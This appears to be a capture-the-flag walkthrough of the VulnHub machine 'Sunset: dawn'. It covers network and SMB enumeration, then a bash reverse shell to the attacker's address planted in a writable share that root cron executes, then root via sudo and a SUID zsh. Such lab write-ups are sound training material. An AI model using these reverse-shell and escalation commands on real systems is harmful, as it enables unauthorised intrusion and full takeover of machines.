# Sunset: dawn

## 1.GET VM IP

```bash
root@kali: arp-scan -I eth0 -l

Interface: eth0, type: EN10MB, MAC: 08:00:27:b2:e9:3f, IPv4: 192.168.56.102
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:0f       (Unknown: locally administered)
192.168.56.100  08:00:27:1d:88:c4       PCS Systemtechnik GmbH
192.168.56.122  08:00:27:e7:ae:cd       PCS Systemtechnik GmbH
```

The IP address is `192.168.56.122`, let's scan it.

## 2.Enumeration

```bash
root@kali: nmap -p80,139,445,3306 -sC -sV -oN nmap.out 192.168.56.122

PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.15-MariaDB-1
|   Thread ID: 12
|   Capabilities flags: 63486
|   Some Capabilities: SupportsCompression, Support41Auth, SupportsTransactions, IgnoreSigpipes, FoundRows, LongColumnFlag, Speaks41ProtocolOld, InteractiveClient, ConnectWithDatabase, Speaks41ProtocolNew, SupportsLoadDataLocal, ODBCClient, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults|   Status: Autocommit
|   Salt: 5%[xm:vf}aPJc2nWF7$L
|_  Auth Plugin Name: mysql_native_password
MAC Address: 08:00:27:E7:AE:CD (Oracle VirtualBox virtual NIC)
Service Info: Host: DAWN

Host script results:
| smb2-time: 
|   date: 2024-02-20T07:44:44
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: dawn
|   NetBIOS computer name: DAWN\x00
|   Domain name: dawn
|   FQDN: dawn.dawn
|_  System time: 2024-02-20T02:44:44-05:00
|_clock-skew: mean: 1h39m57s, deviation: 2h53m12s, median: -2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: DAWN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
```

Checking on port 80 had nothing interesting, i started fuzzing and found these :

```bash
root@kali: gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.56.122

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/logs                 (Status: 301) [Size: 315] [--> http://192.168.56.122/logs/]
/cctv                 (Status: 301) [Size: 315] [--> http://192.168.56.122/cctv/]
```

on `/logs` we see some system log files but only management.log is accessible :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/c4d80524-cc60-4922-86e8-f95b3a03b4c6)


on this log there is nothing but some internal path like :

- /home/dawn/ITDEPT/product-control
- /home/dawn/ITDEPT/product-control
- /home/ganimedes/phobos

we can infere from these paths that there are two users on the system so far :

- dawn
- ganimedes

after that i looked at port 445/139 to find any available share on the system :

```bash
root@kali: smbclient -L 192.168.56.122
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        ITDEPT          Disk      PLEASE DO NOT REMOVE THIS SHARE. IN CASE YOU ARE NOT AUTHORIZED TO USE THIS SYSTEM LEAVE IMMEADIATELY.
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            DAWN
```


and yes there is `ITDEPT` here, so let's check the content :

```bash
root@kali: smbclient --no-pass //192.168.56.122/ITDEPT
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Feb 20 04:09:04 2024
  ..                                  D        0  Fri Aug  2 23:21:39 2019

                7158264 blocks of size 1024. 2803624 blocks available
smb: \>
```

there is nothing here but if we check the permission on this share :

```bash
root@kali: smbmap -H 192.168.56.122
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 192.168.56.122:445      Name: 192.168.56.122            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        ITDEPT                                                  READ, WRITE     PLEASE DO NOT REMOVE THIS SHARE. IN CASE YOU ARE NOT AUTHORIZED TO USE THIS SYSTEM LEAVE IMMEADIATELY.
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.9.5-Debian)
```

we see that we have READ and WRITE permission.

so i just put a random file in it using smbclient and checked the `management.log`, if you upload any thing on this folder these lines of logs are generated :

```text
2024/02/20 04:12:01 [31;1mCMD: UID=0    PID=3283   | /bin/sh -c chmod 777 /home/dawn/ITDEPT/product-control [0m
2024/02/20 04:12:01 [31;1mCMD: UID=0    PID=3282   | /bin/sh -c /home/ganimedes/phobos [0m
2024/02/20 04:12:01 [31;1mCMD: UID=0    PID=3281   | /bin/sh -c chmod 777 /home/dawn/ITDEPT/web-control [0m
2024/02/20 04:12:01 [31;1mCMD: UID=0    PID=3288   | /bin/sh -c chmod 777 /home/dawn/ITDEPT/web-control [0m
2024/02/20 04:12:01 [31;1mCMD: UID=0    PID=3287   | /bin/sh -c chmod 777 /home/dawn/ITDEPT/product-control [0m
```
meaning that the system tries to execute files `web-control` and `product-control` using `sh`

## 3.Gaining Shell

Let's make a file called `web-control` and put a reverse shell in it

```bash
#!/bin/bash

bash -i >& /dev/tcp/192.168.56.102/4444 0>&1
```

start a listener, wait afew seconds and boom :

```bash
root@kali: nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.122] 55016
bash: cannot set terminal process group (4007): Inappropriate ioctl for device
bash: no job control in this shell

www-data@dawn:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 4.Privilege Escalation (Method 1)

Check for sudo permissions :

```bash
www-data@dawn:~$ sudo -l 
sudo -l
Matching Defaults entries for www-data on dawn:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on dawn:
    (root) NOPASSWD: /usr/bin/sudo
```

we can run sudo so :

```bash
www-data@dawn:~$ /usr/bin/sudo sudo /bin/bash

id
uid=0(root) gid=0(root) groups=0(root)

cat flag.txt
Hello! whitecr0wz here. I would like to congratulate and thank you for finishing the ctf, however, there is another way of getting a shell(very similar though). Also, 4 other methods are available for rooting this box!

flag{3a3e52f0a6af0d6e36d7c1ced3a9fd59}
```


## 5.Privilege Escalation (Method 2)

Check for SUID binaries :

```bash
www-data@dawn:~$ find / -user root -perm /4000 2>/dev/null

/usr/sbin/mount.cifs
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/mount
/usr/bin/zsh
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/chfn
```

here we have `/usr/bin/zsh`, so we can get a shell :

```bash
www-data@dawn:~$ /usr/bin/zsh
/usr/bin/zsh
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

This is how you can get root on this machine :)
